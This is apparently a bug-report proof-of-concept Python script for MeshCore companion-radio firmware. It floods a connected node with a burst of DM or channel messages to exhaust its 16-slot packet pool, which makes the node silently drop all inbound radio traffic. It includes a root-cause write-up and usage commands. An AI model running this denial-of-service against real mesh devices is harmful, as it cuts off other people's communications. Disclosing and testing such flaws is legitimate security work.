#!/usr/bin/env python3
"""
Bug #4 PoC — Packet Pool Exhaustion via Rapid Message Sends
============================================================
Affected: StaticPoolPacketManager (pool_size=16 on companion_radio)
          Dispatcher::checkRecv() — drops all inbound when pool empty

Root cause
----------
The packet pool is a fixed-size static array (16 slots on companion
radio firmware).  Each outbound message (DM or channel) allocates one
slot via obtainNewPacket().  Slots are only returned after the radio
finishes transmitting — which takes ~100-500 ms per packet depending
on LoRa parameters.

A rapid burst of send commands from the serial/BLE companion interface
fills the 16-slot pool before the radio can drain it.  Once full:
  • createDatagram / createGroupDatagram return NULL
  • The firmware replies ERR_CODE_TABLE_FULL for new sends
  • **All inbound radio traffic is silently dropped** because
    Dispatcher::checkRecv() cannot allocate a Packet for the RX data

The node stays deaf until enough queued packets are transmitted and
freed.  With long duty-cycle back-off this can take many seconds.

Attack vector
-------------
• A paired companion app (or attacker with BLE/serial access) sends
  ≥16 messages in rapid succession.
• No authentication beyond the initial BLE/serial pairing is required.
• Channel messages work too — no contact needed, just a valid channel.

How to use
----------
1. pip install meshcore

2. Run against a device with a known contact "test":
     python bug4-pool-exhaustion.py -p COM3 --dest test

3. Or use channel 0 (#test) instead (no contact needed):
     python bug4-pool-exhaustion.py -p COM3 --channel 0

4. Adjust burst size (default 20, pool is 16):
     python bug4-pool-exhaustion.py -p COM3 --channel 0 --burst 30

Replace COM3 with your serial port (/dev/ttyUSB0 on Linux).
"""

import asyncio
import argparse
import sys
import time

try:
    from meshcore import MeshCore, EventType
except ImportError:
    sys.exit("meshcore package not found – pip install meshcore")

POOL_SIZE = 16  # companion_radio default


async def main() -> None:
    ap = argparse.ArgumentParser(description="Bug #4 pool-exhaustion PoC")
    ap.add_argument("-p", "--port", required=True, help="Serial port (e.g. COM3)")
    ap.add_argument("-b", "--baud", type=int, default=115200)
    ap.add_argument("-d", "--dest", default=None, help="Contact name for DM flood")
    ap.add_argument("-c", "--channel", type=int, default=None, help="Channel idx for channel flood")
    ap.add_argument("--burst", type=int, default=POOL_SIZE + 4,
                    help=f"Number of messages to send (default {POOL_SIZE + 4})")
    args = ap.parse_args()

    if args.dest is None and args.channel is None:
        sys.exit("Specify --dest and/or --channel")

    mc = await MeshCore.create_serial(args.port, args.baud, debug=False)
    if mc is None:
        sys.exit("Could not connect")

    try:
        await mc.ensure_contacts()

        contact = None
        if args.dest:
            contact = mc.get_contact_by_name(args.dest)
            if not contact:
                print(f"Contact '{args.dest}' not found")
                return

        ok = 0
        err = 0
        print(f"Sending burst of {args.burst} messages (pool_size={POOL_SIZE}) …")
        t0 = time.monotonic()

        for i in range(args.burst):
            msg = f"pool#{i}"
            if contact:
                r = await mc.commands.send_msg(contact, msg)
            else:
                r = await mc.commands.send_chan_msg(args.channel, msg)

            is_err = r.type == EventType.ERROR
            tag = "ERR" if is_err else "OK "
            print(f"  [{i+1:3d}/{args.burst}] {tag}  {r.type.value}")
            if is_err:
                err += 1
            else:
                ok += 1

        elapsed = time.monotonic() - t0
        print(f"\nDone in {elapsed:.1f}s — sent {ok}, failed {err}")
        if err:
            print(f"Pool exhaustion triggered after ~{ok} messages.")
            print("While the pool was full, ALL inbound radio packets were silently dropped.")
        else:
            print("Pool did not exhaust (radio drained fast enough for this burst size).")
            print(f"Try increasing --burst above {args.burst}.")

    finally:
        await mc.disconnect()


if __name__ == "__main__":
    asyncio.run(main())
